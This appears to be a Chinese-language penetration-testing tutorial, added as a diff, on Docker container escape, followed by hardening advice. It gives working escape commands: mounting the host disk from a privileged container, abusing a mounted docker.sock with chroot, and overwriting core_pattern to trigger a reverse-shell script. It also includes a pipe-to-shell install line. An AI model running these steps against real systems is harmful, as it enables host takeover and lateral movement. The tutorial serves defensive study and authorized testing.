@@ -1,0 +1,229 @@
+引言
+
+随着云原生技术的普及，Docker 容器已成为现代应用部署的核心载体。然而，容器化环境并非绝对安全的“沙箱”，其共享宿主机内核的特性带来了新的攻击面。在渗透测试中，容器逃逸是最具破坏性的攻击手法之一——攻击者一旦突破容器隔离，便可直接控制宿主机，进而横向移动至整个集群。本文将从理论原理出发，结合具体实践操作，系统讲解 Docker 容器环境下的渗透测试要点与逃逸技术，帮助安全人员深入理解风险并制定有效防御策略。
+
+---
+
+一、Docker 基础与渗透测试影响
+
+1.1 Docker 是什么？
+
+Docker 是一种操作系统级虚拟化技术，通过容器化将应用及其依赖打包，实现“一次构建，随处运行”。容器共享宿主机内核，但通过命名空间（Namespace）和控制组（Cgroups）进行资源隔离与限制。
+
+1.2 Docker 对渗透测试的影响
+
+· 攻击面扩大：除了应用自身漏洞，还需关注容器引擎、镜像配置、挂载卷等。
+· 隔离性限制：传统入侵后可直接操作宿主机，而在容器中，攻击者首先被困在隔离环境，需要寻找逃逸途径。
+· 横向移动：容器常作为微服务的一部分，攻陷一个容器可能成为进入内部网络的跳板。
+
+1.3 Docker 渗透测试核心切入点
+
+· 镜像漏洞（基础镜像、应用组件）
+· 容器运行时配置（特权模式、挂载、Capabilities）
+· Docker 软件漏洞
+· 宿主机内核漏洞
+
+---
+
+二、Docker 容器风险点全景分析
+
+2.1 容器镜像风险
+
+· 不安全的组件：镜像中可能包含已知漏洞的库或二进制文件（如 Log4j、OpenSSL）。
+· 不安全的镜像：官方镜像未及时更新，或使用了非官方、恶意镜像。
+
+2.2 活动中的容器风险
+
+· 不安全的容器应用：Web 应用存在 SQL 注入、文件上传等漏洞。
+· 不受限制的资源共享：容器可耗尽宿主机资源（DoS）。
+· 不安全的配置与挂载：如挂载敏感目录、特权模式运行。
+
+2.3 其他风险
+
+· 容器网络风险：默认 bridge 网络模式可能导致容器间互相访问。
+· 软件自身漏洞：Docker 守护进程（dockerd）或 runc 的漏洞可导致逃逸。
+· 宿主机操作系统风险：内核漏洞可被容器利用。
+
+---
+
+三、前渗透阶段：判断是否在容器中
+
+3.1 无权限情况下的判断
+
+通过端口扫描或应用行为特征推测：
+
+· 端口扫描发现大量非标准端口（如 2375 Docker API）。
+· 响应头中包含 Server: Docker 或 X-Container-* 字段。
+· 应用路径包含 /var/run/docker.sock 等敏感挂载。
+
+3.2 有权限情况下的判断
+
+若已获取容器 Shell，可通过以下命令确认：
+
+```bash
+cat /proc/1/cgroup | grep -qi docker && echo "Is Docker" || echo "Not Docker"
+```
+
+检查根目录下是否存在 .dockerenv 文件：
+
+```bash
+ls -la /.dockerenv
+```
+
+---
+
+四、前渗透实践：镜像漏洞与默认配置利用
+
+4.1 镜像中的应用漏洞
+
+· 扫描镜像已知漏洞（如 Trivy、Clair）。
+· 对容器内应用进行常规 Web 渗透测试（如 Shiro 反序列化、SQL 注入）。
+
+4.2 镜像中的默认配置
+
+· 检查默认账号密码（如 MySQL root 空密码）。
+· 查看配置文件泄露敏感信息（如数据库连接串、SSH 私钥）。
+
+---
+
+五、后渗透阶段：三种主流容器逃逸手法
+
+5.1 特权模式启动逃逸
+
+原理：--privileged 参数使容器获得宿主机所有 Capabilities，并可访问所有设备。此时可在容器内挂载宿主机磁盘，直接进入宿主机文件系统。
+
+检测方法：
+
+```bash
+cat /proc/self/status | grep CapEff
+# 输出为 0000003fffffffff 或类似全掩码值则极可能是特权容器
+```
+
+利用步骤：
+
+1. 查看宿主机磁盘分区：fdisk -l
+2. 挂载宿主机根分区：mkdir /test && mount /dev/vda1 /test
+3. 进入宿主机目录：cd /test && ls
+
+实战环境搭建：
+
+```bash
+docker run --rm --privileged=true -it alpine
+```
+
+在容器内执行上述命令即可完成逃逸。
+
+5.2 危险挂载启动逃逸
+
+5.2.1 挂载 Docker Socket 逃逸
+
+原理：挂载 /var/run/docker.sock 后，容器内可通过 Docker API 与宿主机 Docker 引擎通信，创建新容器并挂载宿主机根目录，从而控制宿主机。
+
+利用步骤：
+
+1. 检测挂载：ls -lah /var/run/docker.sock
+2. 安装 Docker 客户端（若未安装）：
+   ```bash
+   apt-get update && apt-get install curl
+   curl -fsSL https://get.docker.com/ | sh
+   ```
+3. 启动一个新容器，将宿主机根目录挂载到新容器：
+   ```bash
+   docker run -it -v /:/host ubuntu /bin/bash
+   ```
+4. 在新容器中执行 chroot /host，获得宿主机 Shell。
+
+5.2.2 挂载宿主机 procfs 逃逸
+
+原理：挂载宿主机的 /proc/sys/kernel/core_pattern 文件后，可通过修改 core_pattern 使宿主机在程序崩溃时执行恶意脚本，从而逃逸。
+
+利用步骤（参考 Metarget 项目）：
+
+1. 检测挂载点：find / -name core_pattern
+2. 查看实际挂载路径：cat /proc/mounts | grep docker
+3. 准备反弹 Shell 脚本 /tmp/.x.py（内容见参考链接）。
+4. 修改 core_pattern 指向恶意脚本：
+   ```bash
+   echo -e "|/var/lib/docker/overlay2/<ID>/merged/tmp/.x.py \rcore           " > /host/proc/sys/kernel/core_pattern
+   ```
+5. 编译并执行崩溃程序 ./x，触发脚本执行，获取反弹 Shell。
+
+5.3 Docker 自身及内核漏洞逃逸
+
+· CVE-2021-25741：利用 cp 命令绕过挂载路径检查。
+· CVE-2022-0492：cgroup 漏洞可导致容器逃逸。
+· CVE-2022-0847 (Dirty Pipe)：内核漏洞，容器内可写任意文件。
+· CVE-2020-14386：内核内存破坏漏洞。
+
+利用方式通常需要编译对应漏洞的 exp，并在容器内执行。
+
+---
+
+六、真实场景模拟：从 Web 入口到 Docker 逃逸
+
+6.1 高权限场景：Java 应用（Shiro 漏洞）
+
+使用 vulfocus/shiro-721 镜像，特权模式启动：
+
+```bash
+docker run --rm --privileged=true -it -p 8888:8080 vulfocus/shiro-721
+```
+
+攻击者通过 Shiro 反序列化漏洞获得容器 Shell，因容器为特权模式，直接挂载宿主机磁盘逃逸。
+
+6.2 低权限场景：PHP 应用（DVWA）
+
+使用 sagikazarmark/dvwa 镜像，特权模式启动：
+
+```bash
+docker run --rm --privileged=true -it -p 8080:80 sagikazarmark/dvwa
+```
+
+通过 DVWA 文件上传漏洞获得低权限 Shell，然后检测特权模式，同样挂载宿主机磁盘逃逸。
+
+关键点：即使应用本身权限较低，但若容器以特权模式运行，仍可完成逃逸（部分操作可能需要提权，但挂载磁盘通常可行）。
+
+---
+
+七、防御建议：加固容器环境
+
+7.1 最小权限原则
+
+· 避免特权模式：除非绝对必要，否则不使用 --privileged。
+· 丢弃多余 Capabilities：使用 --cap-drop=ALL 再按需添加。
+· 禁止挂载敏感路径：如 /var/run/docker.sock、宿主机 /proc、/etc、/var/log 等。
+· 使用只读根文件系统：--read-only 可限制容器写入。
+
+7.2 镜像安全
+
+· 使用可信基础镜像，定期扫描漏洞（Trivy、Clair）。
+· 最小化镜像，删除不必要的组件。
+
+7.3 运行时安全
+
+· 启用用户命名空间（userns-remap）隔离容器内 root 用户。
+· 配置 seccomp、AppArmor/SELinux 限制系统调用。
+· 监控容器行为异常（如执行 mount 操作）。
+
+7.4 漏洞管理
+
+· 及时更新 Docker 引擎、runc 和内核。
+· 关注 CVE 公告，优先修复高危逃逸漏洞。
+
+---
+
+八、结语
+
+容器技术极大提升了应用交付效率，但安全配置不当将引入严重风险。从渗透测试视角看，容器逃逸是攻击链的关键一环，其手法多样且实战性强。通过本文的理论分析与实践演示，希望能帮助安全人员深刻理解容器攻防的本质，从而在日常运维中落实安全左移，构建纵深防御体系。云原生安全无小事，唯有持续学习与加固，方能守住最后一道防线。
+
+---
+
+参考资料：
+
+· TeamsSix 云原生安全 Wiki
+· Metarget 项目
+· Docker 官方安全文档
+
+---
+
+注：本文所有演示仅供安全研究及授权测试使用，请勿用于非法用途。
